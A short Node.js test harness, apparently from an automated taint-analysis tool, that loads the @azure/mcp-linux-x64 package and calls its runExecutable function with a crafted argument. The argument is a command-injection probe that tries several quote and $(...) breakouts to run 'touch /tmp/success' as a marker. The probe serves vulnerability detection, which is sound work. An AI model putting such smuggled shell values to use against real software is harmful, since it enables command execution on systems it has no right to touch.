// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/@azure/mcp-linux-x64/node_modules/@azure/mcp-linux-x64');
try {
	var x0 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
new PUT["runExecutable"](x0)();
} catch (e) {
	console.log(e);
}